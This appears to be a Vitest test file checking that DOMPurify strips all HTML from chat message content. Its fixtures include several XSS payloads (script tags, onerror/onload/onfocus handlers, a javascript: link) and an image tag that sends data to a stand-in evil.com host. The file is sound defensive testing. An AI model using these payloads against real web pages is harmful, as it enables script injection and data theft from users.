import { describe, it, expect, beforeEach, vi } from "vitest";
import DOMPurify from "dompurify";
import { JSDOM } from "jsdom";

// Initialize DOMPurify for testing
const window = new JSDOM("").window;
const purify = DOMPurify(window as any);

describe("Message Content Sanitization (Requirement 6.9)", () => {
  describe("dompurify sanitization", () => {
    it("should strip HTML tags from message content", () => {
      const maliciousContent = '<script>alert("XSS")</script>Hello';
      const sanitized = purify.sanitize(maliciousContent, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
      });

      expect(sanitized).not.toContain("<script>");
      expect(sanitized).not.toContain("</script>");
      expect(sanitized).toBe("Hello");
    });

    it("should strip all HTML tags including safe ones", () => {
      const content = "<p>Hello <strong>world</strong></p>";
      const sanitized = purify.sanitize(content, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
      });

      expect(sanitized).not.toContain("<p>");
      expect(sanitized).not.toContain("<strong>");
      expect(sanitized).toBe("Hello world");
    });

    it("should remove event handlers", () => {
      const content = '<div onclick="alert(1)">Click me</div>';
      const sanitized = purify.sanitize(content, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
      });

      expect(sanitized).not.toContain("onclick");
      expect(sanitized).not.toContain("alert");
      expect(sanitized).toBe("Click me");
    });

    it("should remove iframe tags", () => {
      const content = '<iframe src="evil.com"></iframe>Hello';
      const sanitized = purify.sanitize(content, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
      });

      expect(sanitized).not.toContain("<iframe>");
      expect(sanitized).toBe("Hello");
    });

    it("should preserve plain text content", () => {
      const content = "This is a normal message with no HTML";
      const sanitized = purify.sanitize(content, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
      });

      expect(sanitized).toBe(content);
    });

    it("should handle empty strings", () => {
      const content = "";
      const sanitized = purify.sanitize(content, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
      });

      expect(sanitized).toBe("");
    });

    it("should handle special characters", () => {
      const content = "Price: ₦1,500 & more!";
      const sanitized = purify.sanitize(content, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
      });

      expect(sanitized).toContain("₦");
      expect(sanitized).toContain("&");
    });

    it("should remove javascript: protocol", () => {
      const content = '<a href="javascript:alert(1)">Click</a>';
      const sanitized = purify.sanitize(content, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
      });

      expect(sanitized).not.toContain("javascript:");
      expect(sanitized).toBe("Click");
    });

    it("should handle nested HTML tags", () => {
      const content = "<div><p><span><strong>Nested</strong></span></p></div>";
      const sanitized = purify.sanitize(content, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
      });

      expect(sanitized).not.toContain("<");
      expect(sanitized).not.toContain(">");
      expect(sanitized).toBe("Nested");
    });

    it("should handle malformed HTML", () => {
      const content = "<div>Unclosed tag";
      const sanitized = purify.sanitize(content, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
      });

      expect(sanitized).not.toContain("<div>");
      expect(sanitized).toBe("Unclosed tag");
    });
  });

  describe("XSS attack prevention", () => {
    it("should prevent script injection", () => {
      const attacks = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<body onload="alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
      ];

      attacks.forEach((attack) => {
        const sanitized = purify.sanitize(attack, {
          ALLOWED_TAGS: [],
          ALLOWED_ATTR: [],
        });

        expect(sanitized).not.toContain("alert");
        expect(sanitized).not.toContain("onerror");
        expect(sanitized).not.toContain("onload");
        expect(sanitized).not.toContain("onfocus");
      });
    });

    it("should prevent data exfiltration attempts", () => {
      const content = '<img src="http://evil.com/steal?data=secret">';
      const sanitized = purify.sanitize(content, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
      });

      expect(sanitized).not.toContain("evil.com");
      expect(sanitized).not.toContain("src=");
    });
  });
});
